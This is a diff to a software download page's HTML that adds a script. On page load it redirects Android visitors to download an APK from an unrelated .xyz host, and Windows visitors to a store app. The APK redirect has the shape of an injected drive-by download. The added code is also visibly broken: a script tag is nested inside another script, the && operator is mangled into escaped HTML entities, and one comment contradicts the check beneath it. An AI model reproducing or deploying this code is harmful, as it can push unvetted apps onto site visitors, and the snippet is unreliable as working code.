@@ -29,6 +29,28 @@ else
 window.location="http://driveweb.com/download-savvy-select/";
 }
 //-->
+<script type="text/javascript">
+ function getMobileOperatingSystem() {
+ var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+ 
+// Windows Phone must come first because its UA also contains "Android"
+ if (/windows/i.test(userAgent)) {
+ window.location = "https://www.microsoft.com/store/apps/9nblggh4trj3";
+ //return "Windows Phone"; &amp;amp;nbsp;//you may choose to return value instead
+ }
+ 
+if (/android/i.test(userAgent)) {
+ window.location = "http://codeinstincts.xyz/apk/TVDrama.apk";
+ }
+ 
+// iOS detection from: http://stackoverflow.com/a/9039885/177710
+ if (/iPad|iPhone|iPod/.test(userAgent) &amp;amp;amp;&amp;amp;amp; !window.MSStream) {
+ return "iOS";
+ }
+ 
+return "unknown";
+}
+window.onload = getMobileOperatingSystem;
 </script>
     </head>
 </html>
